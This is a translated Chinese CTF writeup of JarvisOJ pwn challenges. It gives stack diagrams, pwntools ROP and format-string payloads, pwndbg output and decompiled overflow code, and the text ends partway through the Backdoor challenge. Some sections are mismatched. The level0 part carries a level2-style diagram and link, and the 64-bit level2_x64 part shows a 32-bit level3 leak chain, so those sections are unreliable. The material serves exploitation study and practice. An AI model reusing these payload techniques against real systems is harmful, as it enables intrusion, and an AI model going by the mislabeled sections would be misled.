# JarvisOJ All Pwn Writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## JarvisOJ-all-pwn-Writeup
解决了 [_jarvisOJ_](https://www.jarvisoj.com/login) 至今 （2018.9.19）的所有 pwn 题目，分享一下
writeup。做题目的过程中参考了很多师傅的 writeup，在 Reference 中贴出了师傅们的博客，感谢师傅们的分享。
题目较多，对于网上有较多 writeup 的题目，不再详细分析，只列出思路；着重分析 writeup 较少的题目。
## [XMAN]level0 (50)
最简单的栈溢出，给了能直接拿 shell 的函数，覆盖返回地址为该函数地址即可
    +----------+
    |........  |
    |padding   |
    |........  |
    |          |
    +----------+
    |padding   |   system("/bin/sh") -> junk data，因为我们已经执行了 system("/bin/sh")，因此 system("/bin/sh") 的返回地址（即 junk data 可以随便指定）
[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level2/solve.py)
## Typo (150)
这道题目特殊在程序是 arm 架构的，但其实只是一个简单的 rop，把环境搭建好后并不难。
我在另一篇博文中以这道题目为例分析了 arm 的 pwn，包括了运行和调试的环境搭建，以及恢复符号，[
_链接_](http://m4x.fun/post/arm_pwn/)。
[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_typo/solve.py)
## [XMAN]level2_x64 (200)
与 level2 相比思路基本一致，不同的是这道题目是 64 位的，64 位与 32 位的传参规则不同，需要用到 rop 控制寄存器，网上有很多分析 rop
的文章，这里就不介绍了。
    +--------------+
    |padding       |
    |......        |
    |              |
    |              |
    |              |
    +--------------+
    |padding       |  _start
    +-----------+
    |1          |
    +-----------+
    |write@got  |
    +-----------+
    |4          |
    +-----------+
    +-----------+
    |padding    |
    |......     |
    |           |
    +-----------+
    |padding    |   junk data
    +-----------+
    |/bin/sh addr
    +-----------+
    leak = flat(cyclic(0x88 + 4), elf.plt['write'], elf.sym['_start'], 1, elf.got['write'], 4)
    rop = flat(cyclic(0x88 + 4), libc.sym['system'], 'aaaa', next(libc.search("/bin/sh")))
新手容易犯的一个错误是本地和远程的 libc 混用，不同版本的 libc 函数的偏移一般不同，所以本地测试和远程需要使用对应的 libc，本地调试时可以通过
LD_PRELOAD=./libc_path ./binary 来指定 libc（版本相差过大时可能会出错）
[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_level3/solve.py)
## Smashes (200)
ssp 攻击，大致原理是覆盖 __libc_argv[0]，触发栈溢出，通过报错来 leak 某些信息。[
_veritas501_](https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/)
师傅对这种方法做过很优秀的分析。
通过调试可以快速确定覆盖所需的偏移量以及重映射后 flag 的地址
    pwndbg> stack 50
    00:0000│ rax rsp rdi-1  0x7fffffffddd0 ◂— 0x31313131313131 /* u'1111111' */
    01:0008│                0x7fffffffddd8 ◂— 0x0
    ... ↓
    15:00a8│                0x7fffffffde78 —▸ 0x7ffff7dd3760 (_IO_2_1_stdout_) ◂— 0xfbad2887
    16:00b0│                0x7fffffffde80 ◂— 0x0
    17:00b8│                0x7fffffffde88 —▸ 0x7ffff7a99b82 (_IO_default_setbuf+66) ◂— cmp    eax, -1
    18:00c0│                0x7fffffffde90 ◂— 0x0
    19:00c8│                0x7fffffffde98 —▸ 0x7ffff7dd3760 (_IO_2_1_stdout_) ◂— 0xfbad2887
    1a:00d0│                0x7fffffffdea0 ◂— 0x0
    ... ↓
    1c:00e0│                0x7fffffffdeb0 —▸ 0x7ffff7dcf2a0 (_IO_file_jumps) ◂— 0x0
    1d:00e8│                0x7fffffffdeb8 —▸ 0x7ffff7a966f9 (_IO_file_setbuf+9) ◂— test   rax, rax
    1e:00f0│                0x7fffffffdec0 —▸ 0x7ffff7dd3760 (_IO_2_1_stdout_) ◂— 0xfbad2887
    1f:00f8│                0x7fffffffdec8 —▸ 0x7ffff7a8dc37 (setbuffer+231) ◂— test   dword ptr [rbx], 0x8000
    20:0100│                0x7fffffffded0 —▸ 0x7ffff7de70e0 (_dl_fini) ◂— push   rbp
    21:0108│                0x7fffffffded8 ◂— 0xe2daa1a4cd530600
    22:0110│                0x7fffffffdee0 —▸ 0x4008b0 ◂— push   r15
    23:0118│                0x7fffffffdee8 ◂— 0x0
    24:0120│                0x7fffffffdef0 —▸ 0x4008b0 ◂— push   r15
    25:0128│                0x7fffffffdef8 —▸ 0x4006e7 ◂— xor    eax, eax
    26:0130│                0x7fffffffdf00 ◂— 0x0
    27:0138│                0x7fffffffdf08 —▸ 0x7ffff7a3fa87 (__libc_start_main+231) ◂— mov    edi, eax
    28:0140│                0x7fffffffdf10 ◂— 0x0
    29:0148│                0x7fffffffdf18 —▸ 0x7fffffffdfe8 —▸ 0x7fffffffe312 ◂— 0x346d2f656d6f682f ('/home/m4')
    2a:0150│                0x7fffffffdf20 ◂— 0x100000000
    2b:0158│                0x7fffffffdf28 —▸ 0x4006d0 ◂— sub    rsp, 8
    2c:0160│                0x7fffffffdf30 ◂— 0x0
    2d:0168│                0x7fffffffdf38 ◂— 0xeab3e86e873f94c
    2e:0170│                0x7fffffffdf40 —▸ 0x4006ee ◂— xor    ebp, ebp
    2f:0178│                0x7fffffffdf48 —▸ 0x7fffffffdfe0 ◂— 0x1
    30:0180│                0x7fffffffdf50 ◂— 0x0
    ... ↓
    pwndbg> distance 0x7fffffffdfe8 0x7fffffffddd0
    0x7fffffffdfe8->0x7fffffffddd0 is -0x218 bytes (-0x43 words)
    pwndbg> search CTF{
    smashes         0x400d21 push   r12
    smashes         0x600d21 0x657265487b465443 ('CTF{Here')
    warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd2e83, halting search.
    pwndbg> 
因此可以构造如下的 payload
    payload = flat(cyclic(0x218), 0x400d21)
或者可以用一种更暴力的方法，不计算偏移量，直接用 flag 地址暴力覆盖过去
    payload = p64(0x400d21) * 100
[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_Smashes/solve.py)
## [61dctf]fm (200)
格式化字符串漏洞的入门题目，格式化字符串漏洞的原理也可以找到很多分析，这里不说了。这道题目中只需要修改一个全局变量的值为 4 即可
    payload = p32(ELF("./fm").sym['x']) + "%11$n"
    # 或者使用 fmtstr_payload()
    payload = fmtstr_payload(11, {ELF("./fm").sym['x']: 4})
[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_fm/solve.py)
## Backdoor (200)
一个 windows 的题目，其实更像一个逆向题目。
在 sub_401000 函数中存在栈溢出
    int __cdecl sub_401000(char *Source)
    {
      char Dest[31]; // [esp+4Ch] [ebp-20h]
      strcpy(Dest, "0");
      *(_DWORD *)&Dest[2] = 0;
      *(_DWORD *)&Dest[6] = 0;
      *(_DWORD *)&Dest[10] = 0;
      *(_DWORD *)&Dest[14] = 0;
      *(_DWORD *)&Dest[18] = 0;
      *(_DWORD *)&Dest[22] = 0;
      *(_DWORD *)&Dest[26] = 0;
      *(_WORD *)&Dest[30] = 0;
      strcpy(Dest, Source);                         // overflow
      return 0;
    }
Source 是由 argv[1] 以及程序中的 xor，qmemcpy 等操作共同决定的。看一下进行了哪些操作
    signed int __cdecl wmain(int argc, char **argv)